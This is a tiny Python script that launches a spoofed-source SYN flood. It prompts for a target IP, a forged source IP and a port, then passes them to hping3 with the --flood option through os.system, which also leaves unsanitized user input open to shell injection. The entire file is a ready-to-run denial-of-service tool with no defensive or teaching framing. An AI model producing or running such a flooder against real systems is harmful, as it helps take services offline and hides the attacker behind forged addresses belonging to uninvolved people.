import os
import ipaddress

print("Enter IP of the Target")
ip=input()

print("Enter IP to Spoof")
spoof=input()

print("Enter port no.:")
port=input()

os.system("hping3 -S "+ip+" -a "+spoof+" -p "+port+" --flood")



